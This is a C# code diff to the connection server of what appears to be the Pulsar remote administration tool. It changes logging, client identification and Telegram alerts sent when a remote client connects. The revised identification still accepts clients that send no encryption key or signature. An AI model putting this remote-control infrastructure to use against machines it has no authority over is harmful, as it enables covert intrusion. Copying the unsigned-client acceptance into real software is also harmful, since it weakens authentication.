@@ -15,8 +15,6 @@ namespace Pulsar.Server.Networking
 {
     public class PulsarServer : Server
     {
-        private string _logPath = System.IO.Path.Combine(System.IO.Path.GetTempPath(), "pulsar_server.log");
-        
         /// <summary>
         /// Gets the clients currently connected and identified to the server.
         /// </summary>
@@ -53,7 +51,7 @@ namespace Pulsar.Server.Networking
             
             if (Models.Settings.TelegramNotifications)
             {
-                Task.Run(() => Send.SendConnectionMessage(
+                Task.Run(() => TelegramService.SendConnectionMessage(
                     Models.Settings.TelegramBotToken,
                     Models.Settings.TelegramChatID,
                     client.Value.Username,
@@ -96,16 +94,8 @@ namespace Pulsar.Server.Networking
         {
             try
             {
-                // Clear log file at startup FIRST
-                try { System.IO.File.Delete(_logPath); } catch { }
-                
                 Log(">>> CTOR START");
                 Log("PulsarServer ctor: Registering event handlers...");
-                
-                base.ClientConnected += (s, c) => {
-                    Log($"[EVENT] ClientConnected fired: {c?.EndPoint}");
-                    OnClientConnected(c);
-                };
                 
                 base.ClientState += (s, c, connected) => {
                     Log($"[EVENT] ClientState fired: endpoint={c?.EndPoint}, connected={connected}");
@@ -135,13 +125,12 @@ namespace Pulsar.Server.Networking
 
         private void Log(string message)
         {
-            try { System.IO.File.AppendAllText(_logPath, $"[{System.DateTime.Now:HH:mm:ss.fff}] {message}\r\n"); } catch { }
+            System.Diagnostics.Debug.WriteLine($"[PulsarServer] {message}");
         }
 
         private void OnClientFail(Server server, Client client, Exception ex)
         {
-            Log($">>> CLIENT FAIL EVENT: {ex.GetType().Name}: {ex.Message}");
-            Log($"    Stack: {ex.StackTrace}");
+            Log($">>> CLIENT FAIL EVENT: {ex?.GetType().Name}");
         }
 
         /// <summary>
@@ -172,8 +161,6 @@ namespace Pulsar.Server.Networking
         /// <param name="message">The received message.</param>
         private void OnClientRead(Server server, Client client, IMessage message)
         {
-            Log($"OnClientRead called - Message type: {message.GetType().Name}, Identified={client.Identified}");
-            
             if (!client.Identified)
             {
                 if (message.GetType() == typeof(ClientIdentification))
@@ -181,14 +168,6 @@ namespace Pulsar.Server.Networking
                     try
                     {
                         ClientIdentification id = (ClientIdentification)message;
-                        Log(">>> IDENTIFICATION PACKET RECEIVED <<<");
-                        Log($"    Tag: {id.Tag}");
-                        Log($"    Id: {id.Id}");
-                        Log($"    EncryptionKey: '{id.EncryptionKey}'");
-                        Log($"    Signature length: {id.Signature?.Length ?? 0}");
-                        Log($"    Username: {id.Username}");
-                        Log($"    Version: {id.Version}");
-                        
                         client.Identified = IdentifyClient(client, id);
                         Log($">>> IdentifyClient returned: {client.Identified} <<<");
                         
@@ -220,24 +199,7 @@ namespace Pulsar.Server.Networking
                 return;
             }
 
-            if (IsHighPriorityMessage(message))
-            {
-                MessageHandler.Process(client, message);
-            }
-            else
-            {
-                ThreadPool.QueueUserWorkItem(_ => 
-                {
-                    try
-                    {
-                        MessageHandler.Process(client, message);
-                    }
-                    catch (Exception ex)
-                    {
-                        Log($"Message processing error: {ex.Message}");
-                    }
-                });
-            }
+            MessageHandler.Process(client, message);
         }
 
         private bool IsHighPriorityMessage(IMessage message)
@@ -247,10 +209,8 @@ namespace Pulsar.Server.Networking
 
         private bool IdentifyClient(Client client, ClientIdentification packet)
         {
-            Log($"[IdentifyClient] Checking packet.Id.Length = {packet.Id.Length}");
-            if (packet.Id.Length != 64)
+            if (packet == null || !MessageInputLimits.IsValidClientId(packet.Id))
             {
-                Log($"[IdentifyClient] Invalid ID length, rejecting");
                 return false;
             }
 
@@ -267,15 +227,23 @@ namespace Pulsar.Server.Networking
             client.Value.EncryptionKey = packet.EncryptionKey;
             client.Value.PublicIP = packet.PublicIP;
 
-            // TESTING MODE: Accept DEBUG/test clients without signature validation
-            Log($"[IdentifyClient] Tag={packet.Tag}, EncryptionKey empty={string.IsNullOrEmpty(packet.EncryptionKey)}");
-            if (packet.Tag == "DEBUG" || string.IsNullOrEmpty(packet.EncryptionKey))
+#if !DEBUG
+            bool hasEncryptionKey = !string.IsNullOrWhiteSpace(packet.EncryptionKey);
+            bool hasSignature = packet.Signature != null &&
+                                packet.Signature.Length > 0 &&
+                                packet.Signature.Length <= 1024;
+
+            // Unpatched release templates use bootstrap settings with no encryption key/signature.
+            // Accept this compatibility shape only when both fields are absent.
+            if (!hasEncryptionKey && !hasSignature)
             {
-                Log($"[IdentifyClient] Accepting test client (DEBUG mode)");
+                Log("[IdentifyClient] Accepted unpatched release bootstrap identification.");
                 return true;
             }
 
-#if !DEBUG
+            if (!hasEncryptionKey || !hasSignature)
+                return false;
+
             try
             {
                 using (var rsa = ServerCertificate.GetRSAPublicKey())
@@ -292,7 +260,7 @@ namespace Pulsar.Server.Networking
                 return false;
             }
 #else
-            Log($"[IdentifyClient] DEBUG mode, accepting without RSA");
+            Log("[IdentifyClient] DEBUG build accepted compatibility identification.");
             return true;
 #endif
         }
